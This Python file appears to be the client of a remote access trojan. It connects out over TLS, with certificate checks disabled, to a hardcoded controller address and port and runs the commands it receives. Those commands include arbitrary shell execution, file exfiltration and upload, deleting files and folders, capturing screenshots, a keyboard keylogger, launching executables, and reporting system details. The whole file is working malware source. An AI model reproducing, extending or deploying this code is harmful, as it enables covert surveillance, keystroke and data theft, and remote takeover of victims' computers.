import socket
import pickle
import time
import os
import shutil
import shlex
import mss
import subprocess
from pynput import keyboard
import threading
import platform
import psutil
import ssl
import random
import string

class App():
    def __init__(self, hostname, port, password):
        self.hostname = hostname
        self.port = port
        self.password = password
        self.status = "IDLE"
        self.cmd = CMD(self)
        self.data_ = None
        self.id = "".join(random.choice(string.ascii_letters + string.digits + string.punctuation) for i in range(15))
        self.context = ssl.create_default_context()
        self.context.check_hostname = False
        self.context.verify_mode = ssl.CERT_NONE

    def run(self):
        while self.status != "CLOSED":
            try:
                sock = socket.create_connection((self.hostname, self.port))
                self.socket = self.context.wrap_socket(sock, server_hostname=self.hostname)
                
                time.sleep(0.05)
                self.socket.sendall(self.status.encode())
                data = self.socket.recv(1024).decode()

                if data == "PINGED":
                    self.status = "PINGED"
                    print("client pinged")
                    self.socket.send(self.id.encode())
                if data == "SELECTED":
                    self.socket.send(self.password.encode())
                    time.sleep(0.1)
                    self.socket.send(self.id.encode())
                    data = self.socket.recv(1024).decode()
                    if data == "GRANTED":
                        print("client selected")
                        self.status = "SELECTED"
                        while self.status != "CLOSED":
                            header = self.socket.recv(4096).decode().strip().split(":")
                            type_, size, name = header[0], int(header[1]), header[2]
                            
                            bytes_data = b""
                            while len(bytes_data) < size:
                                packet = self.socket.recv(min(65536, size - len(bytes_data)))
                                if not packet:
                                    raise ConnectionError("connection broken while receiving data")
                                bytes_data += packet
                            data = pickle.loads(bytes_data)
                            
                            #do things
                            header, data = self.gamberge(type_, name, data)
                            
                            data = pickle.dumps(data)
                            header = header.split(":")
                            header = f"{header[0]}:{len(data)}:{header[1]}"
                            
                            self.socket.send(header.encode()) #send header
                            time.sleep(0.05)
                            self.socket.sendall(data) #send data
                        

                sock.close()
                self.socket.close()
                
            except ConnectionRefusedError:
                pass
                time.sleep(0.1)
            except Exception as e:
                print(0, e)

    def gamberge(self, type_, name, data_in):
        header = "NONE:NONE"
        data = None
        
        if type(data_in) == type((0, 1)):
            self.data_ = data_in[1]
            data_in = data_in[0]
        
        if type_ == "COMMAND":
            try:
                
                if data_in.startswith("schedule"):
                    threading.Thread(target=self.schedule, args=(data_in, )).start()
                    header = "TEXT:SCHEDULE"
                    data = "Done"
                else:
                    parts = shlex.split(data_in)
                    command = parts[0]
                    args = parts[1:]
                    
                    handler = self.cmd.get_command(command)
                    if handler:
                        self.cmd.args = args
                        self.cmd.command = data_in
                        self.cmd.type = "TEXT"
                        data, name = handler()
                        header = f"{self.cmd.type}:{name}"
                    else:
                        data = "COMMAND_NOT_VALID"
                        header = "TEXT:NONE"
            except Exception as e:
                data = str(e)
                header = "TEXT:ERROR"
                print(2, e)
        else:
            data = "TYPE_NOT_VALID"
        
        return header, data
    
    def schedule(self, data):
        data_ = data[9:]
        time_ = float(data[0:data_.find(" ")])
        parts = shlex.split(data_[data_.find(" ") + 1:])
        command = parts[0]
        args = parts[1:]
        
        time.sleep(time_)
        
        self.args = args
        self.command = command
        self.commands[command]()
        
    
class CMD():
    def __init__(self, controller=None):
        self.controller = controller
        self.args = []
        self.type = "TEXT"
        self.command = ""
        self.key_listener = None
        self.keys_log = []
        
    def get_command(self, command_name):
        if hasattr(self, command_name):
            return getattr(self, command_name)
        return None
        
    def cd(self):
        os.chdir(self.args[0])
        return "Done", "CHANGE_DIR"
    
    def cwd(self):
        return os.getcwd(), "GET_CURRENT_DIR"
    
    def ls(self):
        if len(self.args) == 0:
            return os.listdir(os.getcwd()), "LIST_DIR"
        else:
            path = os.path.join(os.getcwd(), self.args[0])
            return os.listdir(path), "LIST_DIR"
    
    def mkdir(self):
        os.mkdir(self.args[0])
        return "Done", "CREATE_DIR"
    
    def remove(self):
        path = os.path.join(os.getcwd(), self.args[0])
        os.remove(path)
        return "Done", "REMOVE_FILE"
    
    def removedir(self):
        path = os.path.join(os.getcwd(), self.args[0])
        shutil.rmtree(path)
        return "Done", "REMOVE_DIR"
    
    def ispath(self):
        path = os.path.join(os.getcwd(), self.args[0])
        return os.path.exists(path), "IS_PATH"
    
    def isdir(self):
        path = os.path.join(os.getcwd(), self.args[0])
        return os.path.isdir(path), "IS_DIR"
    
    def getfile(self):
        with open(self.args[0], "rb") as f:
            data = f.read()
        self.type = "FILE"
        return data, self.args[0]
    
    def sendfile(self):
        with open(f"{os.getcwd()}\{self.args[0]}", "wb") as f:
            f.write(self.controller.data_)
        return "Done", "SEND_FILE"
    
    def zip_(self):
        shutil.make_archive(self.args[0], "zip", os.getcwd())
        return "Done", "ZIP"
    
    def unzip(self):
        time_ = time.time()
        os.mkdir(f"unzipped_{time_}")
        shutil.unpack_archive(self.args[0], f"unzipped_{time_}/")
        return "Done", "UNZIP"
    
    def move(self):
        shutil.move(self.args[0], self.args[1])
        return "Done", "MOVE"
    
    def copyfile(self):
        shutil.copyfile(self.args[0], self.args[1])
        return "Done", "COPY_FILE"
    
    def copydir(self):
        shutil.copytree(self.args[0], self.args[1])
        return "Done", "COPY_DIR"
    
    def screenshot(self):
        with mss.mss() as sct:
            monitor = sct.monitors[0]
            screenshot = sct.grab(monitor)
        self.type = "MSS_IMG"
        return screenshot, "SCREENSHOT"
    
    def cmd(self):
        try:
            output = subprocess.check_output(self.command[4:], shell=True, text=True)
        except subprocess.CalledProcessError as e:
            output = str(e.output)
        return output, "CMD"
    
    def keylogger(self):
        if self.args[0] == "on":
            threading.Thread(target=self.listen_keys, daemon=True).start()
        elif self.args[0] == "off":
            self.key_listener.stop()
        elif self.args[0] == "clear":
            self.keys_log = []
        elif self.args[0] in ["save", "get"]:
            return self.keys_log, "KEYLOGGER"
        else:
            return "Command not found", "KEYLOGGER"
        return "Done", "KEYLOGGER"
    
    def info(self):
        ram = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        infos = {
                " OS : " : platform.system(),
                "OS version : " : platform.version(),
                "Architecture : " : platform.machine(),
                "Processor : " : platform.processor(),
                    
                "CPU cores : " : psutil.cpu_count(logical=True),
                "CPU usage (%) : " : psutil.cpu_percent(interval=1),
                

                "RAM total : " : round(ram.total / (1024 * 1024), 2),
                "RAM used : " : round(ram.used / (1024 * 1024), 2),
                "RAM usage (%) : " : ram.percent,
            
                
                "Disk total (GB) : " : round(disk.total / (1024 ** 3), 2),
                "Disk used (GB) : " : round(disk.used / (1024 ** 3), 2),
                "Disk usage (%) : " : disk.percent,
            }
        return infos, "INFO"
    
    def execute(self):
        path = os.path.join(os.getcwd(), self.args[0])
        os.startfile(path)
        return "Done", "EXECUTE"
    
    def print_(self):
        print(self.args)
        return "Done", "PRINT"
    
    def close(self):
        self.controller.status = "CLOSED"
        return "Done", "CLOSE"
    
    def help_(self):
        return list(self.controller.commands.keys()), "HELP"
    
    def on_press(self, key):
        try:
            self.keys_log.append(key.char)
        except:
            self.keys_log.append(f"[{key.name}]")
    
    def listen_keys(self):
        self.key_listener = keyboard.Listener(on_press=self.on_press)
        self.key_listener.start()
    
    
if __name__ == "__main__":
    app = App("192.168.1.19", 55277, "Id6-DIjjf032_ddo") #server ip address, port(must be same as server), password(must be same as server)
    app.run()
